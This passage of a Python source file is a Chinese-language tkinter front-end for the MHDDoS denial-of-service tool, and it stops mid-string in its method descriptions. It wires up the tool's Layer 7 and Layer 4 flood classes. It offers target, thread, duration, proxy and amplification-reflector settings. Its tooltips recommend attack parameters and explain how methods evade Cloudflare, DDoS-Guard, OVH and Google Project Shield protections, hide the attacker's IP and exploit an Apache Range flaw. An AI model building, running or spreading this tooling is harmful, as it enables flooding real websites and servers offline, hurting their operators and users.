#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MHDDoS GUI工具 - 功能完备的图形界面"""

import sys
import os
import threading
import subprocess
import json
from pathlib import Path
from typing import Optional, Dict, Any
from time import time, sleep
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
from datetime import datetime, timedelta

# 工具提示类
class ToolTip:
    """创建工具提示"""
    def __init__(self, widget, text='widget info'):
        self.widget = widget
        self.text = text
        self.tipwindow = None
        self.id = None
        self.x = self.y = 0
        self._schedule = None
        
        # 绑定鼠标事件
        self.widget.bind('<Enter>', self._on_enter)
        self.widget.bind('<Leave>', self._on_leave)
        self.widget.bind('<ButtonPress>', self._on_leave)

    def _on_enter(self, event=None):
        """鼠标进入"""
        self._schedule = self.widget.after(500, self._show_tip)

    def _on_leave(self, event=None):
        """鼠标离开"""
        if self._schedule:
            self.widget.after_cancel(self._schedule)
            self._schedule = None
        self._hide_tip()

    def _show_tip(self):
        """显示工具提示"""
        if self.tipwindow:
            return
        try:
            x, y, cx, cy = self.widget.bbox("insert") if hasattr(self.widget, 'bbox') and hasattr(self.widget, 'winfo_containing') else (0, 0, 0, 0)
        except:
            x, y, cx, cy = 0, 0, 0, 0
            
        x = x + self.widget.winfo_rootx() + 25
        y = y + cy + self.widget.winfo_rooty() + 20
        self.tipwindow = tw = tk.Toplevel(self.widget)
        tw.wm_overrideredirect(True)
        tw.wm_geometry("+%d+%d" % (x, y))
        label = tk.Label(tw, text=self.text, justify=tk.LEFT,
                        background="#ffffe0", relief=tk.SOLID, borderwidth=1,
                        font=("tahoma", "8", "normal"), wraplength=300)
        label.pack(ipadx=1)

    def _hide_tip(self):
        """隐藏工具提示"""
        tw = self.tipwindow
        self.tipwindow = None
        if tw:
            tw.destroy()

    def schedule(self, text):
        """更新工具提示文本"""
        self.text = text
        if self._schedule:
            self.widget.after_cancel(self._schedule)
        self._schedule = self.widget.after(500, self._show_tip)

# 导入MHDDoS核心模块
try:
    # 确保可以导入start模块
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    import start
    from start import Methods, ToolsConsole, Tools
    from start import handleProxyList, __dir__, con
    from start import HttpFlood, Layer4
    from start import gethostbyname
    from yarl import URL
    from threading import Event
    
    # 全局计数器
    try:
        from start import REQUESTS_SENT, BYTES_SEND
    except ImportError:
        # 如果无法导入，创建占位符
        class Counter:
            def __init__(self, value=0):
                self._value = value
            def __int__(self):
                return self._value
            def set(self, value):
                self._value = value
        
        REQUESTS_SENT = Counter()
        BYTES_SEND = Counter()
        
except ImportError as e:
    import traceback
    print(f"导入错误: {e}")
    print(traceback.format_exc())
    print("请确保 start.py 在同一目录下，并且已安装所有依赖")
    sys.exit(1)


class MHDDoSGUI:
    """MHDDoS图形用户界面主类"""

    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title("MHDDoS - DDoS攻击工具 GUI")
        self.root.geometry("1200x800")
        self.root.resizable(True, True)

        # 状态变量
        self.attack_event: Optional[Event] = None
        self.attack_thread: Optional[threading.Thread] = None
        self.monitor_thread: Optional[threading.Thread] = None
        self.is_attacking = False
        self.start_time: Optional[float] = None
        self.duration: int = 0

        # 创建界面
        self.create_widgets()

        # 加载配置
        self.load_config()

    def create_widgets(self):
        """创建所有界面组件"""
        # 创建笔记本（标签页）
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 攻击配置页面
        self.attack_frame = ttk.Frame(notebook)
        notebook.add(self.attack_frame, text="⚔️ 攻击配置")

        # 工具页面
        self.tools_frame = ttk.Frame(notebook)
        notebook.add(self.tools_frame, text="🔧 工具")

        # 代理管理页面
        self.proxy_frame = ttk.Frame(notebook)
        notebook.add(self.proxy_frame, text="🌐 代理管理")

        # 日志页面
        self.log_frame = ttk.Frame(notebook)
        notebook.add(self.log_frame, text="📋 日志")

        # 创建各页面内容
        self.create_attack_tab()
        self.create_tools_tab()
        self.create_proxy_tab()
        self.create_log_tab()

        # 创建底部状态栏
        self.create_status_bar()

    def create_attack_tab(self):
        """创建攻击配置标签页"""
        # 左侧配置区域
        left_frame = ttk.LabelFrame(self.attack_frame, text="攻击配置", padding=10)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 攻击层选择
        layer_frame = ttk.LabelFrame(left_frame, text="攻击层选择", padding=5)
        layer_frame.pack(fill=tk.X, pady=5)

        self.layer_var = tk.StringVar(value="Layer7")
        layer7_radio = ttk.Radiobutton(
            layer_frame, text="Layer 7 (应用层)", variable=self.layer_var,
            value="Layer7", command=self.update_method_list
        )
        layer7_radio.pack(side=tk.LEFT, padx=10)
        ToolTip(layer7_radio, "Layer 7 (应用层) 攻击\n\n特点:\n• 针对HTTP/HTTPS协议\n• 需要URL地址\n• 支持RPC参数\n• 26种攻击方法\n\n适用: Web网站、Web应用\n\n示例: http://example.com")
        
        layer4_radio = ttk.Radiobutton(
            layer_frame, text="Layer 4 (传输层)", variable=self.layer_var,
            value="Layer4", command=self.update_method_list
        )
        layer4_radio.pack(side=tk.LEFT, padx=10)
        ToolTip(layer4_radio, "Layer 4 (传输层) 攻击\n\n特点:\n• 针对TCP/UDP协议\n• 需要IP:PORT地址\n• 不支持RPC参数\n• 31种攻击方法\n• 部分方法需要管理员权限\n\n适用: 任何TCP/UDP服务、游戏服务器\n\n示例: 192.168.1.1:80")

        # 攻击方法选择
        method_frame = ttk.LabelFrame(left_frame, text="攻击方法", padding=5)
        method_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        method_select_frame = ttk.Frame(method_frame)
        method_select_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(method_select_frame, text="选择方法:").pack(side=tk.LEFT, padx=5)
        self.method_var = tk.StringVar()
        self.method_combo = ttk.Combobox(
            method_select_frame, textvariable=self.method_var,
            state="readonly", width=30
        )
        self.method_combo.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # 方法说明按钮
        self.method_info_btn = ttk.Button(
            method_select_frame, text="📖 说明", command=self.show_method_info
        )
        self.method_info_btn.pack(side=tk.LEFT, padx=5)
        
        self.method_combo.bind("<<ComboboxSelected>>", self.on_method_changed)
        self.update_method_list()
        
        # 方法说明显示区域
        self.method_desc_frame = ttk.LabelFrame(method_frame, text="方法说明", padding=5)
        self.method_desc_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.method_desc_text = scrolledtext.ScrolledText(
            self.method_desc_frame, height=6, wrap=tk.WORD,
            font=("Arial", 9), state=tk.DISABLED
        )
        self.method_desc_text.pack(fill=tk.BOTH, expand=True)

        # 目标配置
        target_frame = ttk.LabelFrame(left_frame, text="目标配置", padding=5)
        target_frame.pack(fill=tk.X, pady=5)

        target_label = ttk.Label(target_frame, text="目标URL/IP:")
        target_label.pack(anchor=tk.W)
        ToolTip(target_label, "目标地址格式\n\nLayer 7 (应用层):\n• http://example.com\n• https://example.com/path\n• example.com (自动添加http://)\n\nLayer 4 (传输层):\n• 192.168.1.1:80\n• example.com:443\n• IP:PORT 格式")
        
        self.target_var = tk.StringVar()
        target_entry = ttk.Entry(target_frame, textvariable=self.target_var, width=50)
        target_entry.pack(fill=tk.X, pady=2)
        
        target_hint = ttk.Label(
            target_frame,
            text="Layer7: http://example.com  Layer4: 192.168.1.1:80",
            font=("Arial", 8), foreground="gray"
        )
        target_hint.pack(anchor=tk.W)

        # 端口配置（仅Layer4）
        self.port_frame = ttk.Frame(target_frame)
        port_label = ttk.Label(self.port_frame, text="端口:")
        port_label.pack(side=tk.LEFT, padx=5)
        ToolTip(port_label, "目标端口号（仅Layer 4）\n\n范围: 1 - 65535\n\n常用端口:\n• 80: HTTP\n• 443: HTTPS\n• 22: SSH\n• 53: DNS\n• 3306: MySQL\n• 27015: Steam游戏\n\n注意: Layer 7会自动从URL解析端口")
        
        self.port_var = tk.StringVar(value="80")
        ttk.Entry(self.port_frame, textvariable=self.port_var, width=10).pack(
            side=tk.LEFT, padx=5
        )

        # 线程和参数配置
        params_frame = ttk.LabelFrame(left_frame, text="攻击参数", padding=5)
        params_frame.pack(fill=tk.X, pady=5)

        # 线程数
        threads_label = ttk.Label(params_frame, text="线程数:")
        threads_label.grid(row=0, column=0, sticky=tk.W, pady=2)
        ToolTip(threads_label, "同时运行的攻击线程数量\n\n建议值:\n• Layer 7: 100-1,000\n• Layer 4: 500-5,000\n• 最大: 10,000\n\n警告: 线程数过高可能导致系统资源耗尽")
        
        self.threads_var = tk.StringVar(value="100")
        threads_spinbox = ttk.Spinbox(
            params_frame, from_=1, to=10000, textvariable=self.threads_var,
            width=15
        )
        threads_spinbox.grid(row=0, column=1, sticky=tk.W, padx=5, pady=2)

        # RPC（仅Layer7）
        self.rpc_frame = ttk.Frame(params_frame)
        rpc_label = ttk.Label(self.rpc_frame, text="RPC (每连接请求数):")
        rpc_label.pack(side=tk.LEFT)
        ToolTip(rpc_label, "每个TCP连接发送的HTTP请求数量\n\n适用范围: 仅Layer 7攻击\n\n建议值:\n• 普通目标: 1-5 RPC\n• 高带宽目标: 5-20 RPC\n• 最大: 100 RPC (不推荐)\n\n作用: 增加单个连接的利用率, 提高攻击效率\n注意: RPC过高可能导致连接过早关闭")
        
        self.rpc_var = tk.StringVar(value="1")
        rpc_spinbox = ttk.Spinbox(
            self.rpc_frame, from_=1, to=100, textvariable=self.rpc_var, width=10
        )
        rpc_spinbox.pack(side=tk.LEFT, padx=5)
        # 初始状态：Layer7显示，Layer4隐藏
        self.rpc_frame.grid(row=2, column=0, columnspan=2, sticky=tk.W, padx=5, pady=2)

        # 持续时间
        duration_label = ttk.Label(params_frame, text="持续时间(秒):")
        duration_label.grid(row=1, column=0, sticky=tk.W, pady=2)
        ToolTip(duration_label, "攻击持续时间（秒）\n\n范围: 1 - 86400秒 (24小时)\n\n建议:\n• 测试: 10-60秒\n• 短时间攻击: 60-300秒\n• 长时间攻击: 300-3600秒\n\n注意: 时间越长，资源消耗越大")
        
        self.duration_var = tk.StringVar(value="60")
        duration_spinbox = ttk.Spinbox(
            params_frame, from_=1, to=86400, textvariable=self.duration_var,
            width=15
        )
        duration_spinbox.grid(row=1, column=1, sticky=tk.W, padx=5, pady=2)

        # 代理配置
        proxy_config_frame = ttk.LabelFrame(left_frame, text="代理配置", padding=5)
        proxy_config_frame.pack(fill=tk.X, pady=5)

        # 代理类型
        proxy_type_label = ttk.Label(proxy_config_frame, text="代理类型:")
        proxy_type_label.grid(row=0, column=0, sticky=tk.W, pady=2)
        ToolTip(proxy_type_label, "代理服务器类型\n\n• 0=全部: 使用所有类型代理\n• 1=HTTP: 仅HTTP代理\n• 4=SOCKS4: 仅SOCKS4代理\n• 5=SOCKS5: 仅SOCKS5代理\n• 6=随机: 随机选择类型\n\n提示: 使用代理可以:\n• 增加攻击带宽\n• 隐藏本机IP\n• 绕过IP限制")
        
        self.proxy_type_var = tk.StringVar(value="0=不使用代理")
        proxy_type_combo = ttk.Combobox(
            proxy_config_frame, textvariable=self.proxy_type_var,
            values=["0=不使用代理", "1=HTTP", "4=SOCKS4", "5=SOCKS5", "6=随机"],
            state="readonly", width=15
        )
        proxy_type_combo.grid(row=0, column=1, sticky=tk.W, padx=5, pady=2)

        # 代理文件
        ttk.Label(proxy_config_frame, text="代理文件:").grid(
            row=1, column=0, sticky=tk.W, pady=2
        )
        proxy_file_frame = ttk.Frame(proxy_config_frame)
        proxy_file_frame.grid(row=1, column=1, sticky=tk.W+tk.E, padx=5, pady=2)
        self.proxy_file_var = tk.StringVar(value="proxy.txt")
        ttk.Entry(proxy_file_frame, textvariable=self.proxy_file_var, width=20).pack(
            side=tk.LEFT
        )
        ttk.Button(
            proxy_file_frame, text="浏览", command=self.browse_proxy_file
        ).pack(side=tk.LEFT, padx=5)

        # 反射器文件（仅Layer4放大攻击）
        self.reflector_frame = ttk.LabelFrame(left_frame, text="反射器文件 (仅放大攻击)", padding=5)
        reflector_label = ttk.Label(self.reflector_frame, text="反射器文件:")
        reflector_label.pack(anchor=tk.W)
        ToolTip(reflector_label, "反射器文件（仅放大攻击需要）\n\n放大攻击方法: DNS, NTP, MEM, RDP, CHAR, CLDAP, ARD\n\n要求:\n• 文件包含开放反射器服务器IP列表\n• 每行一个IP地址\n• 例如: 8.8.8.8\n\n警告: ⚠️ 放大攻击需要:\n• 可IP欺骗的网络环境\n• 原始套接字权限\n• 仅用于授权的渗透测试")
        reflector_file_frame = ttk.Frame(self.reflector_frame)
        reflector_file_frame.pack(fill=tk.X, pady=2)
        self.reflector_file_var = tk.StringVar()
        ttk.Entry(reflector_file_frame, textvariable=self.reflector_file_var, width=30).pack(
            side=tk.LEFT
        )
        ttk.Button(
            reflector_file_frame, text="浏览", command=self.browse_reflector_file
        ).pack(side=tk.LEFT, padx=5)
        # 初始状态：Layer4隐藏，Layer7也隐藏（因为不是放大攻击时不需要）
        self.reflector_frame.pack_forget()

        # 调试模式
        self.debug_var = tk.BooleanVar(value=False)
        debug_check = ttk.Checkbutton(
            left_frame, text="调试模式", variable=self.debug_var
        )
        debug_check.pack(anchor=tk.W, pady=5)
        ToolTip(debug_check, "启用调试模式\n\n功能:\n• 显示详细的调试信息\n• 输出更多日志\n• 有助于排查问题\n\n注意: 启用后会产生大量日志输出")

        # 控制按钮
        button_frame = ttk.Frame(left_frame)
        button_frame.pack(fill=tk.X, pady=10)

        self.start_button = ttk.Button(
            button_frame, text="▶️ 开始攻击", command=self.start_attack,
            style="Accent.TButton"
        )
        self.start_button.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)

        self.stop_button = ttk.Button(
            button_frame, text="⏹️ 停止攻击", command=self.stop_attack,
            state=tk.DISABLED
        )
        self.stop_button.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)

        # 右侧监控区域
        right_frame = ttk.LabelFrame(self.attack_frame, text="实时监控", padding=10)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 状态信息
        status_info_frame = ttk.LabelFrame(right_frame, text="状态信息", padding=5)
        status_info_frame.pack(fill=tk.X, pady=5)

        self.status_labels = {}
        status_items = [
            ("目标", "target_status"),
            ("方法", "method_status"),
            ("状态", "attack_status"),
            ("运行时间", "runtime_status"),
            ("剩余时间", "remaining_status"),
            ("代理状态", "proxy_status"),
            ("代理数量", "proxy_count"),
        ]
        for i, (label, key) in enumerate(status_items):
            ttk.Label(status_info_frame, text=f"{label}:").grid(
                row=i, column=0, sticky=tk.W, padx=5, pady=2
            )
            status_label = ttk.Label(status_info_frame, text="-", foreground="gray")
            status_label.grid(row=i, column=1, sticky=tk.W, padx=5, pady=2)
            self.status_labels[key] = status_label

        # 性能统计
        stats_frame = ttk.LabelFrame(right_frame, text="性能统计", padding=5)
        stats_frame.pack(fill=tk.X, pady=5)

        self.stats_labels = {}
        stats_items = [
            ("PPS (每秒请求数)", "pps_stats"),
            ("BPS (每秒字节数)", "bps_stats"),
            ("总请求数", "total_requests"),
            ("总字节数", "total_bytes"),
            ("代理使用率", "proxy_usage"),
        ]
        for i, (label, key) in enumerate(stats_items):
            ttk.Label(stats_frame, text=f"{label}:").grid(
                row=i, column=0, sticky=tk.W, padx=5, pady=2
            )
            stats_label = ttk.Label(stats_frame, text="0", foreground="blue")
            stats_label.grid(row=i, column=1, sticky=tk.W, padx=5, pady=2)
            self.stats_labels[key] = stats_label

        # 代理性能统计（仅在攻击时显示）
        self.proxy_stats_frame = ttk.LabelFrame(right_frame, text="代理性能统计", padding=5)
        self.proxy_stats_frame.pack(fill=tk.X, pady=5)
        
        self.proxy_stats_labels = {}
        proxy_stats_items = [
            ("代理类型", "proxy_type_display"),
            ("代理文件", "proxy_file_display"),
            ("平均负载", "proxy_avg_load"),
            ("估算带宽", "proxy_estimated_bw"),
        ]
        for i, (label, key) in enumerate(proxy_stats_items):
            ttk.Label(self.proxy_stats_frame, text=f"{label}:").grid(
                row=i, column=0, sticky=tk.W, padx=5, pady=2
            )
            stats_label = ttk.Label(self.proxy_stats_frame, text="-", foreground="gray", font=("Arial", 9))
            stats_label.grid(row=i, column=1, sticky=tk.W, padx=5, pady=2)
            self.proxy_stats_labels[key] = stats_label
        
        # 进度条
        progress_frame = ttk.Frame(right_frame)
        progress_frame.pack(fill=tk.X, pady=5)
        ttk.Label(progress_frame, text="攻击进度:").pack(anchor=tk.W)
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(
            progress_frame, variable=self.progress_var, maximum=100, length=300
        )
        self.progress_bar.pack(fill=tk.X, pady=2)

    def create_tools_tab(self):
        """创建工具标签页"""
        # 工具选择
        tool_select_frame = ttk.LabelFrame(self.tools_frame, text="工具选择", padding=10)
        tool_select_frame.pack(fill=tk.X, padx=5, pady=5)

        tools = [
            ("CFIP", "查找Cloudflare后的真实IP"),
            ("DNS", "DNS记录查询"),
            ("TSSRV", "TeamSpeak SRV解析"),
            ("PING", "Ping服务器"),
            ("CHECK", "检查网站状态"),
            ("INFO", "IP地址信息查询"),
            ("DSTAT", "系统统计信息"),
            ("PROXYTEST", "测试代理连接"),
        ]

        self.tool_var = tk.StringVar()
        for i, (tool, desc) in enumerate(tools):
            row = i // 2
            col = (i % 2) * 2
            ttk.Radiobutton(
                tool_select_frame, text=tool, variable=self.tool_var,
                value=tool
            ).grid(row=row, column=col, sticky=tk.W, padx=10, pady=5)
            ttk.Label(
                tool_select_frame, text=desc, font=("Arial", 8),
                foreground="gray"
            ).grid(row=row, column=col+1, sticky=tk.W, padx=5)

        # 工具输入
        input_frame = ttk.LabelFrame(self.tools_frame, text="输入", padding=10)
        input_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(input_frame, text="输入地址/域名:").pack(anchor=tk.W)
        self.tool_input_var = tk.StringVar()
        ttk.Entry(input_frame, textvariable=self.tool_input_var, width=60).pack(
            fill=tk.X, pady=5
        )

        ttk.Button(
            input_frame, text="执行工具", command=self.run_tool
        ).pack(pady=5)

        # 工具输出
        output_frame = ttk.LabelFrame(self.tools_frame, text="输出", padding=10)
        output_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.tool_output = scrolledtext.ScrolledText(
            output_frame, height=15, wrap=tk.WORD
        )
        self.tool_output.pack(fill=tk.BOTH, expand=True)

    def create_proxy_tab(self):
        """创建代理管理标签页"""
        # 代理列表
        list_frame = ttk.LabelFrame(self.proxy_frame, text="代理列表", padding=10)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 工具栏
        toolbar = ttk.Frame(list_frame)
        toolbar.pack(fill=tk.X, pady=5)

        ttk.Button(toolbar, text="下载代理", command=self.download_proxies).pack(
            side=tk.LEFT, padx=5
        )
        ttk.Button(toolbar, text="检查代理", command=self.check_proxies).pack(
            side=tk.LEFT, padx=5
        )
        ttk.Button(toolbar, text="高级检查", command=self.advanced_check_proxies).pack(
            side=tk.LEFT, padx=5
        )
        ToolTip(toolbar.winfo_children()[-1], "高级代理质量检查\n\n功能:\n• 测试连接速度\n• 测试延迟\n• 测试稳定性\n• 质量评分和筛选\n\n建议: 用于筛选高质量代理")
        ttk.Button(toolbar, text="刷新列表", command=self.refresh_proxy_list).pack(
            side=tk.LEFT, padx=5
        )
        ttk.Button(toolbar, text="清空列表", command=self.clear_proxy_list).pack(
            side=tk.LEFT, padx=5
        )

        # 代理类型选择
        ttk.Label(toolbar, text="类型:").pack(side=tk.LEFT, padx=10)
        self.proxy_download_type_var = tk.StringVar(value="0")
        ttk.Combobox(
            toolbar, textvariable=self.proxy_download_type_var,
            values=["0=全部", "1=HTTP", "4=SOCKS4", "5=SOCKS5"],
            state="readonly", width=12
        ).pack(side=tk.LEFT, padx=5)
        
        # 筛选功能
        ttk.Label(toolbar, text="筛选:").pack(side=tk.LEFT, padx=10)
        self.proxy_filter_var = tk.StringVar()
        filter_entry = ttk.Entry(toolbar, textvariable=self.proxy_filter_var, width=20)
        filter_entry.pack(side=tk.LEFT, padx=5)
        filter_entry.bind("<KeyRelease>", lambda e: self._filter_proxy_list())
        ToolTip(filter_entry, "输入IP、端口或类型进行筛选\n例如: 192.168, :8080, HTTP")
        
        ttk.Button(toolbar, text="清除筛选", command=self._clear_proxy_filter).pack(
            side=tk.LEFT, padx=5
        )

        # 代理文件选择
        ttk.Label(toolbar, text="文件:").pack(side=tk.LEFT, padx=10)
        self.proxy_manage_file_var = tk.StringVar(value="proxy.txt")
        ttk.Entry(toolbar, textvariable=self.proxy_manage_file_var, width=15).pack(
            side=tk.LEFT, padx=5
        )

        # 代理列表显示
        columns = ("序号", "代理地址", "类型", "状态")
        self.proxy_tree = ttk.Treeview(list_frame, columns=columns, show="headings", height=15)
        self.proxy_tree.pack(fill=tk.BOTH, expand=True)

        for col in columns:
            self.proxy_tree.heading(col, text=col)
            self.proxy_tree.column(col, width=150)

        # 滚动条
        proxy_scroll = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.proxy_tree.yview)
        proxy_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.proxy_tree.configure(yscrollcommand=proxy_scroll.set)

        # 统计信息
        self.proxy_count_label = ttk.Label(
            list_frame, text="代理总数: 0", font=("Arial", 10, "bold")
        )
        self.proxy_count_label.pack(pady=5)

    def create_log_tab(self):
        """创建日志标签页"""
        # 日志控制
        log_control_frame = ttk.Frame(self.log_frame)
        log_control_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(log_control_frame, text="清空日志", command=self.clear_log).pack(
            side=tk.LEFT, padx=5
        )
        ttk.Button(log_control_frame, text="保存日志", command=self.save_log).pack(
            side=tk.LEFT, padx=5
        )

        # 日志级别
        ttk.Label(log_control_frame, text="日志级别:").pack(side=tk.LEFT, padx=10)
        self.log_level_var = tk.StringVar(value="INFO")
        ttk.Combobox(
            log_control_frame, textvariable=self.log_level_var,
            values=["DEBUG", "INFO", "WARNING", "ERROR"],
            state="readonly", width=10
        ).pack(side=tk.LEFT, padx=5)

        # 日志显示
        self.log_text = scrolledtext.ScrolledText(
            self.log_frame, height=30, wrap=tk.WORD, state=tk.DISABLED
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # 配置日志标签颜色
        self.log_text.tag_config("DEBUG", foreground="gray")
        self.log_text.tag_config("INFO", foreground="black")
        self.log_text.tag_config("WARNING", foreground="orange")
        self.log_text.tag_config("ERROR", foreground="red")

    def create_status_bar(self):
        """创建状态栏"""
        self.status_bar = ttk.Label(
            self.root, text="就绪", relief=tk.SUNKEN, anchor=tk.W
        )
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def update_method_list(self):
        """更新攻击方法列表"""
        if self.layer_var.get() == "Layer7":
            methods = sorted(Methods.LAYER7_METHODS)
            # 检查属性是否存在再操作
            if hasattr(self, 'rpc_frame'):
                self.rpc_frame.grid(row=2, column=0, columnspan=2, sticky=tk.W, padx=5, pady=2)
            if hasattr(self, 'reflector_frame'):
                self.reflector_frame.pack_forget()
        else:
            methods = sorted(Methods.LAYER4_METHODS)
            # 检查属性是否存在再操作
            if hasattr(self, 'rpc_frame'):
                self.rpc_frame.grid_forget()
            # Layer4默认隐藏反射器，只有选择放大攻击方法时才显示

        if hasattr(self, 'method_combo'):
            self.method_combo["values"] = methods
            if methods:
                self.method_combo.set(methods[0])
                self.update_method_description(methods[0])
                # 触发方法改变回调，自动设置代理类型
                self.on_method_changed()

    def on_method_changed(self, event=None):
        """方法选择改变时的回调"""
        method = self.method_var.get()
        if method:
            self.update_method_description(method)
            # 如果是放大攻击方法，显示反射器文件框
            if hasattr(self, 'reflector_frame'):
                if method in Methods.LAYER4_AMP:
                    self.reflector_frame.pack(fill=tk.X, pady=5)
                else:
                    self.reflector_frame.pack_forget()
            
            # 根据方法是否支持代理，自动设置代理类型默认值
            if hasattr(self, 'proxy_type_var'):
                # 定义支持代理的方法
                methods_support_proxy = {
                    # Layer 7: 所有方法都支持代理
                    "GET", "POST", "STRESS", "DYN", "SLOW", "CFB", "CFBUAM",
                    "BYPASS", "APACHE", "XMLRPC", "BOT", "DGB", "OVH", "AVB",
                    # Layer 4: 部分方法支持代理
                    "TCP", "CPS", "CONNECTION", "MINECRAFT", "MCBOT"
                }
                
                # 定义不支持代理的方法
                methods_no_proxy = {
                    "SYN", "ICMP", "UDP", "VSE", "TS3", "MCPE", "FIVEM", 
                    "FIVEM-TOKEN", "OVH-UDP", "NTP", "DNS", "RDP", "CHAR", 
                    "MEM", "CLDAP", "ARD", "AMP"
                }
                
                current_proxy_type = self.proxy_type_var.get()
                
                if method in methods_support_proxy:
                    # 方法支持代理：如果当前是"0=不使用代理"，自动设置为"5=SOCKS5"（推荐）
                    if current_proxy_type == "0=不使用代理" or current_proxy_type == "0":
                        self.proxy_type_var.set("5=SOCKS5")
                        self.log(f"方法 {method} 支持代理，已自动设置为 SOCKS5（可手动改为不使用代理）", "INFO")
                elif method in methods_no_proxy:
                    # 方法不支持代理：自动设置为"0=不使用代理"
                    if current_proxy_type != "0=不使用代理" and current_proxy_type != "0":
                        self.proxy_type_var.set("0=不使用代理")
                        self.log(f"方法 {method} 不支持代理，已自动设置为不使用代理", "INFO")

    def update_method_description(self, method: str):
        """更新方法说明"""
        if not hasattr(self, 'method_desc_text'):
            return
            
        descriptions = self._get_method_descriptions()
        desc = descriptions.get(method, f"方法 {method} 的详细说明请点击'说明'按钮查看")
        
        self.method_desc_text.config(state=tk.NORMAL)
        self.method_desc_text.delete(1.0, tk.END)
        self.method_desc_text.insert(1.0, desc)
        self.method_desc_text.config(state=tk.DISABLED)

    def _get_method_descriptions(self) -> dict:
        """获取所有方法的说明"""
        return {
            # Layer 7 基础方法
            "GET": """原理: 发送大量HTTP GET请求
特点: 最基础的HTTP攻击方法
适用: 任何HTTP服务器
优势: 简单高效，资源消耗低
绕过能力: 弱
建议: 适用于无防护的普通网站""",
            
            "POST": """原理: 发送大量HTTP POST请求，包含数据负载
特点: 比GET消耗更多服务器资源
适用: 有表单处理的网站
优势: 占用服务器处理资源更多
负载: 包含JSON数据负载
建议: 适用于需要处理数据的服务器""",
            
            "HEAD": """原理: 发送HTTP HEAD请求（仅请求头，不请求内容）
特点: 消耗带宽较小但占用连接
适用: HTTP服务器
优势: 服务器仍需处理请求
建议: 适用于占用连接池的场景""",
            
            # Layer 7 绕过防护方法
            "CFB": """原理: 使用cloudscraper绕过CloudFlare防护
特点: 自动处理验证和cookie
适用: 使用CloudFlare CDN的网站
优势: 可以绕过基本的CloudFlare保护
限制: 无法绕过高级验证（如5秒盾）
建议: 针对有CloudFlare的网站首选方法""",
            
            "CFBUAM": """原理: 等待CloudFlare挑战并尝试绕过
特点: 处理Under Attack模式
适用: CloudFlare的Under Attack模式
优势: 针对高防护模式
限制: 速度较慢，需要等待验证
建议: 适用于CloudFlare的高级防护模式""",
            
            "DGB": """原理: 模拟浏览器行为绕过DDoS-Guard
特点: 自动处理cookie和验证流程
适用: 使用DDoS-Guard服务的网站
优势: 专门针对DDoS-Guard优化
建议: 针对使用DDoS-Guard的网站""",
            
            "AVB": """原理: 针对Arvan Cloud防护的绕过技术
特点: 适配Arvan Cloud的防护机制
适用: 使用Arvan Cloud的网站
优势: 针对特定CDN服务
建议: 适用于Arvan Cloud托管的网站""",
            
            "OVH": """原理: 绕过OVH防火墙的检测
特点: 使用特殊请求头和处理方式
适用: OVH托管的主机
优势: 针对OVH防护优化
建议: 适用于OVH托管的服务器""",
            
            "BYPASS": """原理: 通用绕过方法，使用Session保持
特点: 适用于多种基础防护
适用: 有简单防护的网站
优势: 通用性好
建议: 适用于基础防护的网站""",
            
            "GSB": """原理: 绕过Google Project Shield防护
特点: 针对Google的DDoS防护服务
适用: 使用Google Project Shield的网站
优势: 专门针对Google防护
建议: 适用于Google Project Shield保护的网站""",
            
            # Layer 7 特殊方法
            "STRESS": """原理: 发送大负载的POST请求（524字节数据）
特点: 消耗更多带宽和处理资源
适用: 需要处理数据的服务器
优势: 同时占用带宽和CPU
建议: 配合高线程数使用""",
            
            "SLOW": """原理: 保持连接打开，缓慢发送数据头（Slowloris）
特点: 占用服务器连接池
适用: Apache等有限连接数的服务器
优势: 低带宽消耗，高连接占用
资源消耗: 低带宽，高连接数
建议: 适用于Apache等有限连接数的服务器""",
            
            "RHEX": """原理: 在路径中使用随机HEX字符
特点: 增加缓存失效
适用: 有CDN缓存的网站
优势: 绕过缓存，直接攻击源站
建议: 适用于有CDN缓存的网站""",
            
            "STOMP": """原理: 绕过chk_captcha验证
特点: 使用特殊字符和路径
适用: 有验证码挑战的网站
优势: 处理验证码流程
建议: 适用于有验证码防护的网站""",
            
            "DYN": """原理: 使用随机子域名请求
特点: 绕过基于主域名的防护
适用: 有子域名解析的网站
优势: 可能绕过某些基于域名的限制
建议: 适用于有子域名的网站""",
            
            "NULL": """原理: 使用空的User-Agent和Referer
特点: 模拟异常请求
适用: 检测简单User-Agent过滤的防护
优势: 绕过基础的UA检查
建议: 适用于简单UA过滤的防护""",
            
            "COOKIE": """原理: 发送随机Cookie值
特点: 触发PHP的isset($_COOKIE)检查
适用: 使用Cookie验证的PHP应用
优势: 消耗服务器Cookie处理资源
建议: 适用于PHP网站""",
            
            "PPS": """原理: 仅发送 GET / HTTP/1.1\\r\\n\\r\\n
特点: 最简化的请求，最大化PPS
适用: 快速发送大量请求
优势: 极高PPS，低资源消耗
建议: 适用于追求高PPS的场景""",
            
            "EVEN": """原理: GET方法配合读取响应
特点: 保持连接活跃，读取响应
适用: 需要保持连接的服务器
优势: 占用连接和带宽
建议: 适用于需要保持连接的场景""",
            
            "APACHE": """原理: 使用Range请求头攻击Apache漏洞
特点: 触发Apache的Range处理漏洞
适用: 未打补丁的Apache服务器
优势: 可能导致服务器高负载
